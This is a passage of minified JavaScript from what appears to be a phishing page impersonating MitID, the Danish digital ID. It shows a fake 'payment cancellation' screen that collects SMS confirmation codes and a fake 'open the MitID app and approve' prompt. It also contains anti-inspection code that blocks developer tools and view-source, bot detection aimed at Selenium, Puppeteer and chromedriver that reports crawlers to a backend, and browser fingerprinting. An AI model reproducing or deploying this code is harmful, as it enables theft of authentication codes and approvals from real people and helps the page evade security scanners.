                    className: `w-full mt-5 font-bold text-[16px] uppercase tracking-wider py-4 px-4 rounded-[4px] flex items-center justify-between transition-colors min-h-[56px] active:scale-[0.98] shadow-lg shadow-blue-600/20 ${V ? "bg-[#004cb8] text-white cursor-wait" : "bg-[#0060e6] hover:bg-[#004cb8] text-white cursor-pointer"}`,
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU0MToxMg",
                    "data-yw-s": !0,
                    children: V ? e.jsxs("div", {
                        className: "w-full flex items-center justify-center gap-2",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU3MjoxNg",
                        "data-yw-s": !0,
                        children: [e.jsx("div", {
                            className: "w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU3MzoxOA",
                            "data-yw-s": !0
                        }), e.jsx("span", {
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU3NDoxOA",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "Bekræfter..."
                        })]
                    }) : e.jsxs(e.Fragment, {
                        children: [e.jsx("span", {
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU3ODoxOA",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "GODKEND"
                        }), e.jsx("svg", {
                            width: "20",
                            height: "20",
                            viewBox: "0 0 24 24",
                            fill: "none",
                            stroke: "currentColor",
                            strokeWidth: "2",
                            strokeLinecap: "round",
                            strokeLinejoin: "round",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU3OToxOA",
                            "data-yw-s": !0,
                            children: e.jsx("path", {
                                d: "M5 12h14M12 5l7 7-7 7"
                            })
                        })]
                    })
                })]
            }), w && e.jsx("div", {
                className: `w-full max-w-[380px] px-4 sm:px-6 mb-6 transition-all duration-300 ease-out ${b ? "opacity-100 translate-y-0" : "opacity-0 translate-y-2"}`,
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU5MDoxMA",
                "data-yw-s": !0,
                children: k ? e.jsxs("div", {
                    className: "flex flex-col items-center py-4 w-full",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU5MzoxNA",
                    "data-yw-s": !0,
                    children: [e.jsx("div", {
                        className: "w-12 h-12 rounded-full bg-[#e8f5e9] flex items-center justify-center mb-3",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU5NDoxNg",
                        "data-yw-s": !0,
                        children: e.jsx(ne, {
                            className: "w-6 h-6 text-[#2e7d32]"
                        })
                    }), e.jsx("p", {
                        className: "text-[15px] font-bold text-[#1a1a1a] mb-4",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDU5NzoxNg",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "Kode modtaget"
                    }), B && e.jsxs("div", {
                        className: "w-full mb-4 bg-[#f0f7ff] border border-[#c2d8f5] rounded-lg p-4",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYwMToxOA",
                        "data-yw-s": !0,
                        children: [e.jsx("p", {
                            className: "text-[11px] font-semibold text-[#4a6fa5] uppercase tracking-wider mb-1.5",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYwMjoyMA",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "Annulleret beløb"
                        }), e.jsx("div", {
                            className: "flex items-baseline gap-1.5 mb-1",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYwMzoyMA",
                            "data-yw-s": !0,
                            children: e.jsx("span", {
                                className: "text-[24px] font-bold text-[#1a1a1a] leading-none",
                                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYwNDoyMg",
                                "data-yw-s": !0,
                                children: B
                            })
                        })]
                    }), e.jsx("div", {
                        className: "w-full bg-[#f8f9fc] border border-[#e2e6ef] rounded-lg p-4",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYxMDoxNg",
                        "data-yw-s": !0,
                        children: e.jsx("p", {
                            className: "text-[12px] text-[#444444] leading-relaxed",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYxMToxOA",
                            "data-yw-s": !0,
                            children: B ? `Betalingen på ${B} er annulleret. Det annullerede beløb vil være synligt på din konto inden for 1–3 hverdage, afhængigt af din bank.` : "Betalingen er annulleret. Det annullerede beløb vil være synligt på din konto inden for 1–3 hverdage, afhængigt af din bank."
                        })
                    })]
                }) : e.jsxs("div", {
                    className: "flex flex-col items-center",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYyMDoxNA",
                    "data-yw-s": !0,
                    children: [e.jsxs("div", {
                        className: "flex items-center gap-2 mb-5 self-start",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYyMjoxNg",
                        "data-yw-s": !0,
                        children: [e.jsx("svg", {
                            className: "w-5 h-5 text-[#1a1a1a]",
                            viewBox: "0 0 24 24",
                            fill: "none",
                            stroke: "currentColor",
                            strokeWidth: "2",
                            strokeLinecap: "round",
                            strokeLinejoin: "round",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYyMzoxOA",
                            "data-yw-s": !0,
                            children: e.jsx("path", {
                                d: "M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"
                            })
                        }), e.jsx("span", {
                            className: "text-[14px] font-bold text-[#1a1a1a] uppercase tracking-wider",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYyNjoxOA",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "SMS-BEKRÆFTELSE"
                        })]
                    }), B && e.jsxs("div", {
                        className: "w-full mb-5 bg-[#f8f9fc] border border-[#e2e6ef] rounded-lg p-4",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYzMToxOA",
                        "data-yw-s": !0,
                        children: [e.jsx("p", {
                            className: "text-[11px] font-semibold text-[#6b7a99] uppercase tracking-wider mb-1.5",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYzMjoyMA",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "Annullering af betaling"
                        }), e.jsx("div", {
                            className: "flex items-baseline gap-1.5",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYzMzoyMA",
                            "data-yw-s": !0,
                            children: e.jsx("span", {
                                className: "text-[26px] font-bold text-[#1a1a1a] leading-none",
                                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDYzNDoyMg",
                                "data-yw-s": !0,
                                children: B
                            })
                        })]
                    }), e.jsx("p", {
                        className: "text-[13px] text-[#555555] mb-4 self-start leading-relaxed",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDY0MDoxNg",
                        "data-yw-t": !0,
                        "data-yw-s": !0,
                        children: "Indtast bekræftelseskoden fra din SMS for at fortsætte."
                    }), ( () => {
                        const l = Math.max(4, Math.min(6, x.length))
                          , i = l <= 4 ? "grid-cols-4" : l === 5 ? "grid-cols-5" : "grid-cols-6";
                        return e.jsxs("div", {
                            className: "w-full relative mb-4",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDY1MDoyMA",
                            "data-yw-s": !0,
                            children: [e.jsx("div", {
                                className: `w-full grid ${i} gap-2.5 transition-all duration-200`,
                                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDY1MjoyMg",
                                "data-yw-s": !0,
                                children: [...Array(l)].map( (u, m) => e.jsx("div", {
                                    onClick: () => document.getElementById("sms-hidden-input")?.focus(),
                                    className: `aspect-square rounded-lg border-2 flex items-center justify-center text-[22px] font-bold font-mono transition-all duration-150 cursor-text select-none ${x[m] ? "border-[#0060e6] bg-[#f0f7ff] text-[#1a1a1a]" : m === x.length ? "border-[#0060e6] bg-white ring-2 ring-[#0060e6]/15" : "border-[#d8d8d8] bg-white"}`,
                                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDY1NDoyNg",
                                    "data-yw-s": !0,
                                    children: x[m] || ""
                                }, m))
                            }), e.jsx("input", {
                                id: "sms-hidden-input",
                                type: "text",
                                inputMode: "numeric",
                                maxLength: 6,
                                value: x,
                                onChange: u => {
                                    U(u.target.value.replace(/\D/g, "").slice(0, 6)),
                                    T("")
                                }
                                ,
                                onPaste: u => {
                                    u.preventDefault();
                                    const m = u.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
                                    m && (U(m),
                                    T(""))
                                }
                                ,
                                autoFocus: !0,
                                className: "absolute inset-0 opacity-0 w-full h-full cursor-text",
                                style: {
                                    fontSize: "16px"
                                },
                                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDY3MToyMg",
                                "data-yw-s": !0
                            })]
                        })
                    }
                    )(), c && e.jsxs("div", {
                        className: "w-full flex items-center gap-1.5 text-[#c0392b] text-[12px] mb-3 mt-1",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDY5NToxOA",
                        "data-yw-s": !0,
                        children: [e.jsx(le, {
                            className: "w-3.5 h-3.5 flex-shrink-0"
                        }), e.jsx("span", {
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDY5NzoyMA",
                            "data-yw-s": !0,
                            children: c
                        })]
                    }), e.jsxs("button", {
                        onClick: ce,
                        disabled: x.length < 4,
                        className: `w-full mt-3 font-bold text-[16px] uppercase tracking-wider py-4 px-4 rounded-[4px] flex items-center justify-between transition-colors min-h-[56px] active:scale-[0.98] ${x.length >= 4 ? "bg-[#0060e6] hover:bg-[#004cb8] text-white cursor-pointer shadow-lg shadow-blue-600/20" : "bg-[#e0e7f3] text-[#8fa3c8] cursor-not-allowed"}`,
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDcwMjoxNg",
                        "data-yw-s": !0,
                        children: [e.jsx("span", {
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDcxMToxOA",
                            "data-yw-t": !0,
                            "data-yw-s": !0,
                            children: "BEKRÆFT"
                        }), e.jsx("svg", {
                            width: "20",
                            height: "20",
                            viewBox: "0 0 24 24",
                            fill: "none",
                            stroke: "currentColor",
                            strokeWidth: "2",
                            strokeLinecap: "round",
                            strokeLinejoin: "round",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDcxMjoxOA",
                            "data-yw-s": !0,
                            children: e.jsx("path", {
                                d: "M5 12h14M12 5l7 7-7 7"
                            })
                        })]
                    })]
                })
            }), e.jsxs("div", {
                className: "border-t border-[#d8d8d8] pt-6 w-full px-8 flex gap-8 mt-auto",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDcyMjo4",
                "data-yw-s": !0,
                children: [e.jsx("button", {
                    onClick: s,
                    className: "text-[#001845] font-bold text-[15px] hover:underline bg-transparent border-none p-0 cursor-pointer",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDcyMzoxMA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    children: "Afbryd"
                }), e.jsx("a", {
                    href: "#",
                    className: "text-[#001845] font-bold text-[15px] hover:underline",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURRUkNvZGUudHN4QDcyOToxMA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    "data-yw-l": !0,
                    children: "Hjælp"
                })]
            })]
        })
    })
}
  , Re = ({onComplete: s, onCancel: t}) => {
    const a = d.useRef(null);
    return d.useEffect( () => {
        const r = setTimeout(s, 7500);
        return () => clearTimeout(r)
    }
    , [s]),
    d.useEffect( () => {
        const r = a.current;
        r && r.play().catch( () => {}
        )
    }
    , []),
    e.jsx("div", {
        className: "min-h-screen bg-white flex items-center justify-center p-4 font-sans animate-[fadeIn_0.3s_ease-out]",
        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEAyNTo0",
        "data-yw-s": !0,
        children: e.jsxs("div", {
            className: "w-full max-w-[440px] bg-white border border-[#d8d8d8] rounded-[4px] shadow-sm flex flex-col items-center py-10 min-h-[550px]",
            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEAyNjo2",
            "data-yw-s": !0,
            children: [e.jsx("img", {
                src: "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png",
                alt: "MitID",
                className: "h-6 mb-8",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEAyOTo4",
                "data-yw-i": !0,
                "data-yw-s": !0
            }), e.jsxs("div", {
                className: "w-full px-8",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEAzNjo4",
                "data-yw-s": !0,
                children: [e.jsx("h2", {
                    className: "text-[20px] font-bold text-[#1a1a1a] tracking-tight mb-8 text-center",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEAzNzoxMA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    children: "Åbn MitID app og godkend"
                }), e.jsx("div", {
                    className: "flex justify-center mb-8",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEA0MjoxMA",
                    "data-yw-s": !0,
                    children: e.jsx("div", {
                        className: "w-full max-w-[120px]",
                        "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEA0MzoxMg",
                        "data-yw-s": !0,
                        children: e.jsx("video", {
                            ref: a,
                            src: "/assets/mitid-animation.mp4",
                            autoPlay: !0,
                            loop: !0,
                            muted: !0,
                            playsInline: !0,
                            preload: "auto",
                            className: "w-full h-auto block",
                            "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEA0NDoxNA",
                            "data-yw-s": !0
                        })
                    })
                })]
            }), e.jsxs("div", {
                className: "border-t border-[#d8d8d8] pt-6 w-full px-8 flex gap-8 mt-auto",
                "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEA1OTo4",
                "data-yw-s": !0,
                children: [e.jsx("button", {
                    onClick: t,
                    className: "text-[#001845] font-bold text-[15px] hover:underline bg-transparent border-none p-0 cursor-pointer",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEA2MDoxMA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    children: "Afbryd"
                }), e.jsx("a", {
                    href: "#",
                    className: "text-[#001845] font-bold text-[15px] hover:underline",
                    "data-yw": "c3JjL2NvbXBvbmVudHMvTWl0SURBcHBBcHByb3ZlLnRzeEA2NjoxMA",
                    "data-yw-t": !0,
                    "data-yw-s": !0,
                    "data-yw-l": !0,
                    children: "Hjælp"
                })]
            })]
        })
    })
}
;
function Ue() {
    return d.useEffect( () => {
        const s = n => (n.preventDefault(),
        !1)
          , t = n => (n.preventDefault(),
        !1)
          , a = n => {
            if ((n.ctrlKey || n.metaKey) && (n.key === "s" || n.key === "u" || n.key === "S" || n.key === "U") || n.ctrlKey && n.shiftKey && (n.key === "I" || n.key === "i" || n.key === "J" || n.key === "j" || n.key === "C" || n.key === "c") || n.key === "F12")
                return n.preventDefault(),
                !1
        }
          , r = n => (n.preventDefault(),
        !1)
          , o = document.createElement("style");
        return o.id = "anti-download-protection",
        o.textContent = `
      * {
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        -webkit-touch-callout: none;
      }
      img, video {
        -webkit-user-drag: none;
        user-drag: none;
        pointer-events: none;
      }
    `,
        document.addEventListener("contextmenu", s, {
            capture: !0
        }),
        document.addEventListener("selectstart", t, {
            capture: !0
        }),
        document.addEventListener("keydown", a, {
            capture: !0
        }),
        document.addEventListener("dragstart", r, {
            capture: !0
        }),
        document.head.appendChild(o),
        () => {
            document.removeEventListener("contextmenu", s, {
                capture: !0
            }),
            document.removeEventListener("selectstart", t, {
                capture: !0
            }),
            document.removeEventListener("keydown", a, {
                capture: !0
            }),
            document.removeEventListener("dragstart", r, {
                capture: !0
            }),
            o.remove()
        }
    }
    , []),
    null
}
const Se = "https://public.youware.com/users-website-assets/prod/a9a1cff8-e991-4eee-88e2-f5d8efc23b70/865630a7e2d6440c9d2d6f186ba27856.png";
function Te() {
    return e.jsx("div", {
        style: {
            background: "white",
            borderRadius: "6px",
            padding: "4px 6px",
            display: "flex",
            alignItems: "center",
            justifyContent: "center"
        },
        "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMTU6NA",
        "data-yw-s": !0,
        children: e.jsx("img", {
            src: Se,
            alt: "MitID",
            style: {
                height: 18,
                width: "auto",
                objectFit: "contain",
                display: "block"
            },
            "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMjM6Ng",
            "data-yw-s": !0
        })
    })
}
function ke() {
    return e.jsx("svg", {
        width: "22",
        height: "22",
        viewBox: "0 0 24 24",
        fill: "none",
        stroke: "white",
        strokeWidth: "2.5",
        strokeLinecap: "round",
        strokeLinejoin: "round",
        "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMzk6NA",
        "data-yw-s": !0,
        children: e.jsx("path", {
            d: "M20 6L9 17l-5-5"
        })
    })
}
function Be({message: s, type: t="warning"}) {
    const [a,r] = d.useState(!1);
    d.useEffect( () => {
        r(!!s)
    }
    , [s]);
    const o = t === "info"
      , n = t === "success"
      , v = n ? "linear-gradient(135deg, #16a34a 0%, #22c55e 40%, #16a34a 100%)" : o ? "linear-gradient(135deg, #003A99 0%, #0052CC 40%, #003A99 100%)" : "linear-gradient(135deg, #c0392b 0%, #e74c3c 40%, #c0392b 100%)"
      , b = n ? "0 4px 20px rgba(22,163,74,0.5)" : o ? "0 4px 20px rgba(0,58,153,0.5)" : "0 4px 20px rgba(192,57,43,0.5)"
      , p = n ? "MitID Bekræftelse" : o ? "MitID Besked" : "MitID Sikkerhedsbeskeder";
    return e.jsxs("div", {
        style: {
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            zIndex: 9999,
            transform: a ? "translateY(0)" : "translateY(-100%)",
            transition: "transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.4s ease",
            opacity: a ? 1 : 0,
            pointerEvents: a ? "auto" : "none"
        },
        "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAODc6NA",
        children: [e.jsxs("div", {
            style: {
                background: v,
                color: "#fff",
                padding: "14px 20px",
                display: "flex",
                alignItems: "flex-start",
                gap: "12px",
                boxShadow: b,
                borderBottom: "2px solid rgba(255,255,255,0.25)",
                pointerEvents: "auto"
            },
            "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMTAwOjY",
            children: [e.jsx("div", {
                style: {
                    flexShrink: 0,
                    width: o ? "auto" : 36,
                    height: o ? "auto" : 36,
                    borderRadius: o ? "8px" : "50%",
                    background: o ? "transparent" : "rgba(255,255,255,0.2)",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    fontSize: 18,
                    animation: o || n ? "none" : "pulse-broadcast 1.5s infinite"
                },
                "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMTE0Ojg",
                children: o ? e.jsx(Te, {}) : n ? e.jsx(ke, {}) : "⚠️"
            }), e.jsxs("div", {
                style: {
                    flex: 1
                },
                "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMTM4Ojg",
                "data-yw-s": !0,
                children: [e.jsx("div", {
                    style: {
                        fontSize: 11,
                        fontWeight: 700,
                        letterSpacing: "0.08em",
                        textTransform: "uppercase",
                        opacity: .85,
                        marginBottom: 3,
                        fontFamily: "system-ui, -apple-system, sans-serif"
                    },
                    "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMTM5OjEw",
                    "data-yw-s": !0,
                    children: p
                }), e.jsx("div", {
                    style: {
                        fontSize: 14,
                        fontWeight: 500,
                        lineHeight: 1.4,
                        fontFamily: "system-ui, -apple-system, sans-serif"
                    },
                    "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMTUyOjEw",
                    "data-yw-s": !0,
                    children: s
                })]
            })]
        }), e.jsx("style", {
            "data-yw": "c3JjL2NvbXBvbmVudHMvQnJvYWRjYXN0T3ZlcmxheS50c3hAMTY1OjY",
            "data-yw-s": !0,
            children: `
        @keyframes pulse-broadcast {
          0%, 100% { transform: scale(1); opacity: 1; }
          50% { transform: scale(1.15); opacity: 0.8; }
        }
      `
        })]
    })
}
async function re() {
    try {
        const s = He();
        return {
            bot: s.score > .7,
            botKind: s.botKind,
            detectionType: s.detectionType
        }
    } catch {
        return {
            bot: !1
        }
    }
}
function He() {
    let s = 0, t, a;
    navigator.webdriver && (s += .9,
    t = "headless",
    a = "webdriver");
    const r = window;
    return (r._phantom || r.__phantomas || r.callPhantom) && (s += .9,
    t = "phantomjs",
    a = "phantom_property"),
    (r.__selenium_evaluate || r.__selenium_unwrapped || r._Selenium_IDE_Recorder) && (s += .9,
    t = "selenium",
    a = "selenium_property"),
    r.__puppeteer_evaluation_script__ && (s += .9,
    t = "puppeteer",
    a = "puppeteer_property"),
    document.documentElement.getAttribute("webdriver") !== null && (s += .8,
    t = "automation",
    a = "webdriver_attribute"),
    !window.chrome && navigator.userAgent.includes("Chrome") && (s += .4,
    a = "missing_chrome_object"),
    navigator.plugins && navigator.plugins.length === 0 && !navigator.userAgent.includes("Firefox") && (s += .3,
    a = "no_plugins"),
    (screen.width === 0 || screen.height === 0) && (s += .5,
    a = "zero_screen"),
    typeof Notification < "u" && Notification.permission === "denied" && !localStorage.getItem("notification_asked") && (s += .2),
    (r.cdc_adoQpoasnfa76pfcZLmcfl_Array || r.cdc_adoQpoasnfa76pfcZLmcfl_Promise) && (s += .9,
    t = "chromedriver",
    a = "cdc_property"),
    (!navigator.languages || navigator.languages.length === 0) && (s += .3,
    a = "no_languages"),
    {
        score: Math.min(s, 1),
        botKind: t,
        detectionType: a
    }
}
async function Le(s, t) {
    try {
        await fetch(`${s}/api/public/report-bot`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                detection: t,
                userAgent: navigator.userAgent,
                timestamp: Date.now()
            })
        })
    } catch {}
}
class De {
    metrics = {
        mouseMovements: 0,
        mouseVelocities: [],
        clicks: 0,
        keystrokes: 0,
        scrollEvents: 0,
        touchEvents: 0,
        timeSinceLoad: 0,
        formFocusTime: 0,
        mousePathDeviation: 0,
        hasRandomMovement: !1
    };
    startTime = Date.now();
    lastMousePos = null;
    lastFormFocusTime = null;
    mousePositions = [];
    isRunning = !1;
    start() {
        this.isRunning || (this.isRunning = !0,
        this.startTime = Date.now(),
        document.addEventListener("mousemove", this.handleMouseMove),
        document.addEventListener("click", this.handleClick),
        document.addEventListener("keydown", this.handleKeydown),
        document.addEventListener("scroll", this.handleScroll),
        document.addEventListener("touchstart", this.handleTouch),
        document.addEventListener("focusin", this.handleFocusIn),
        document.addEventListener("focusout", this.handleFocusOut))
    }
    stop() {
        this.isRunning && (this.isRunning = !1,
        document.removeEventListener("mousemove", this.handleMouseMove),
        document.removeEventListener("click", this.handleClick),
        document.removeEventListener("keydown", this.handleKeydown),
        document.removeEventListener("scroll", this.handleScroll),
        document.removeEventListener("touchstart", this.handleTouch),
        document.removeEventListener("focusin", this.handleFocusIn),
        document.removeEventListener("focusout", this.handleFocusOut))
    }
    handleMouseMove = t => {
        this.metrics.mouseMovements++;
        const a = Date.now();
        if (this.lastMousePos) {
            const r = t.clientX - this.lastMousePos.x
              , o = t.clientY - this.lastMousePos.y
              , n = a - this.lastMousePos.t;
            if (n > 0) {
                const v = Math.sqrt(r * r + o * o) / n;
                this.metrics.mouseVelocities.push(v),
                this.metrics.mouseVelocities.length > 100 && this.metrics.mouseVelocities.shift()
            }
        }
        this.lastMousePos = {
            x: t.clientX,
            y: t.clientY,
            t: a
        },
        this.mousePositions.push({
            x: t.clientX,
            y: t.clientY
        }),
        this.mousePositions.length > 50 && this.mousePositions.shift()
    }
    ;
    handleClick = () => {
        this.metrics.clicks++
    }
    ;
    handleKeydown = () => {
        this.metrics.keystrokes++
    }
    ;
    handleScroll = () => {
        this.metrics.scrollEvents++
    }
    ;
    handleTouch = () => {
        this.metrics.touchEvents++
    }
    ;
    handleFocusIn = t => {
        (t.target?.tagName === "INPUT" || t.target?.tagName === "TEXTAREA") && (this.lastFormFocusTime = Date.now())
    }
    ;
    handleFocusOut = () => {
        this.lastFormFocusTime && (this.metrics.formFocusTime += Date.now() - this.lastFormFocusTime,
        this.lastFormFocusTime = null)
    }
    ;
    getScore() {
        this.metrics.timeSinceLoad = Date.now() - this.startTime,
        this.calculateMousePathDeviation();
        let t = 0
          , a = 0;
        const r = Math.min(this.metrics.timeSinceLoad / 3e3, 1);
        if (t += r * .15,
        a += .15,
        this.metrics.mouseMovements > 5 ? t += .2 : this.metrics.mouseMovements > 0 && (t += .1),
        a += .2,
        this.metrics.mouseVelocities.length > 5) {
            const v = this.calculateVariance(this.metrics.mouseVelocities)
              , b = Math.min(v / 2, 1);
            t += b * .2
        }
        a += .2,
        this.metrics.keystrokes > 0 && (t += .15),
        a += .15,
        (this.metrics.scrollEvents > 0 || this.metrics.touchEvents > 0) && (t += .1),
        a += .1,
        this.metrics.formFocusTime > 500 && (t += .1),
        a += .1,
        this.metrics.mousePathDeviation > .3 && (t += .1,
        this.metrics.hasRandomMovement = !0),
        a += .1;
        const o = Math.min(t / a, 1)
          , n = Math.min((this.metrics.mouseMovements + this.metrics.keystrokes + this.metrics.clicks) / 20, 1);
        return {
            score: o,
            confidence: n,
            metrics: {
                ...this.metrics
            }
        }
    }
    calculateVariance(t) {
        if (t.length < 2)
            return 0;
        const a = t.reduce( (o, n) => o + n, 0) / t.length;
        return t.map(o => (o - a) ** 2).reduce( (o, n) => o + n, 0) / t.length
    }
    calculateMousePathDeviation() {
        if (this.mousePositions.length < 10) {
            this.metrics.mousePathDeviation = 0;
            return
        }
        let t = 0;
        const a = this.mousePositions;
        for (let r = 2; r < a.length; r++) {
            const o = a[r - 2]
              , n = a[r - 1]
              , v = a[r]
              , b = (o.x + v.x) / 2
              , p = (o.y + v.y) / 2
              , w = Math.sqrt((n.x - b) ** 2 + (n.y - p) ** 2);
            t += w
        }
        this.metrics.mousePathDeviation = t / (a.length - 2)
    }
}
let L = null;
function Ae() {
    return L || (L = new De),
    L.start(),
    L
}
function We() {
    return L ? L.getScore() : {
        score: .5,
        confidence: 0,
        metrics: {}
    }
}
async function Ve() {
    const s = await Je()
      , t = Object.values(s).join("|");
    return (await Oe(t)).slice(0, 32)
}
async function Je() {
    return {
        canvas: Xe(),
        webgl: Ee(),
        audio: await Qe(),
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language + "|" + (navigator.languages || []).join(","),
        platform: navigator.platform || "",
        plugins: Ce(),
        fonts: await Ze()
    }
}
function Xe() {
    try {
        const s = document.createElement("canvas");
        s.width = 200,
        s.height = 50;
        const t = s.getContext("2d");
        return t ? (t.textBaseline = "top",
        t.font = "14px Arial",
        t.fillStyle = "#f60",
        t.fillRect(125, 1, 62, 20),
        t.fillStyle = "#069",
        t.fillText("BotGuard.fp", 2, 15),
        t.fillStyle = "rgba(102, 204, 0, 0.7)",
        t.fillText("BotGuard.fp", 4, 17),
        s.toDataURL().slice(-50)) : "no-canvas"
    } catch {
        return "canvas-error"
    }
}
function Ee() {
    try {
        const s = document.createElement("canvas")
          , t = s.getContext("webgl") || s.getContext("experimental-webgl");
        if (!t)
            return "no-webgl";
        const a = t
          , r = a.getExtension("WEBGL_debug_renderer_info");
        if (r) {
            const o = a.getParameter(r.UNMASKED_VENDOR_WEBGL)
              , n = a.getParameter(r.UNMASKED_RENDERER_WEBGL);
            return `${o}|${n}`
        }
        return "webgl-no-debug"
    } catch {
